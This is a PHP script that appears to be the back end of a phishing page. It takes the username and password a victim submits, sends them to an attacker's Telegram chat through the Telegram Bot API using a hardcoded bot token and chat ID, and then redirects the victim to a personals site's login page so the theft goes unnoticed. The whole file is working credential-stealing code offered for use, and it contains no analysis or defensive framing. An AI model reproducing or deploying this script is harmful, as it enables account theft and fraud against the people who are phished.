<?php
  // Telegram Bot API token
  $token = '7488762311:AAGuRko7hFIdg62UZehofzu2bo3xatKFlnA';

  // Get the form data
  $username = $_POST['username'];
  $password = $_POST['password'];


  // Create a Telegram message with the form data
  $message = "Email: $username\nPassword: $password";

  // Send the message to the Telegram bot
  $url = "https://api.telegram.org/bot$token/sendMessage";
  $data = array('chat_id' => '6720286026', 'text' => $message);
  $options = array(
    'http' => array(
      'method' => 'POST',
      'header' => 'Content-Type: application/json',
      'content' => json_encode($data)
    )
  );
  $context = stream_context_create($options);
  $result = file_get_contents($url, false, $context);

  // Check if the message was sent successfully
  if ($result === false) {
    echo 'Error sending message to Telegram bot';
  } else {
    header("Location: https://megapersonals.fun/users/auth/login");
  }
?>